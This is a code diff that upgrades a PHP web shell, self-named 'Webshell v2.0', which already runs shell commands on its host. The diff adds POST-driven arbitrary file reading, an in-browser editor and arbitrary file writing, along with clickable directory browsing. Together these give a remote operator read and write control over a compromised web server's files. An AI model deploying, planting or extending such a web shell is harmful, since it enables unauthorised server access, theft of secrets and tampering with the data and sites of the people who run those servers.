@@ -1,8 +1,20 @@
 <?php
-    $NAME = "Webshell v1.0";
+    $NAME = "Webshell v2.0";
 
+    // $FILE_READ = "";
     if(isset($_POST["chdir"])){
-        chdir($_POST["chdir"]);
+        if(is_dir($_POST["chdir"]))
+            chdir($_POST["chdir"]);
+        else {
+            chdir(dirname($_POST["chdir"]));
+            $FILE_READ = file_get_contents($_POST["chdir"]);
+        }
+    }
+
+    if(isset($_POST["file_change"])){
+        $file = fopen($_POST["file_change"], "w"); //or echo "Unable to open file!";
+        fwrite($file, $_POST["file_changes"]);
+        fclose($file);
     }
 
     $CURRENT_DEVICE = shell_exec("uname -a");
@@ -49,6 +61,16 @@
         </iframe>
 
         <pre><?php echo htmlspecialchars($CMD); ?></pre>
+
+        <?php
+            if(isset($FILE_READ)){
+                echo "<h3>Content of ".htmlspecialchars($_POST["chdir"])."</h3>";
+                echo "<pre><form method=\"post\" action=\"".htmlspecialchars($_SERVER["PHP_SELF"])."\" class=\"nav-btn\">";
+                echo "<input name=\"file_change\" type=\"hidden\" value=\"".$_POST["chdir"]."\">";
+                echo "<textarea name=\"file_changes\">".htmlspecialchars($FILE_READ)."</textarea>";
+                echo "<br><input type=\"submit\" value=\"Save\"></form></pre>";
+            }
+        ?>
 
         <?php
             function getDirContents($dir) {
@@ -147,7 +169,11 @@
                     // print_r($contents);
                     foreach ($contents as $dir => $values) {
                         echo "<tr>";
-                        echo "<th>".$dir."</th>";
+
+                        echo "<th><form method=\"post\" action=\"".htmlspecialchars($_SERVER["PHP_SELF"])."\" class=\"nav-btn\">
+                            <input type=\"hidden\" name=\"chdir\" value=\"".$CURRENT_DIR.'/'.$dir."\">
+                            <input type=\"submit\" value=\"".$dir."\"></input></form></th>";
+                        // echo "<th>".$dir."</th>";
                         echo "<th>".$values["type"]."</th>";
                         echo "<th>".$values["filesize"]."</th>";
                         echo "<th>".$values["owner"]."</th>";
@@ -196,6 +222,10 @@
             }
             table tbody tr:hover{
                 background-color: gray;
+            }
+            textarea{
+                width: 50%;
+                height: 200px;
             }
         </style>
     </body>
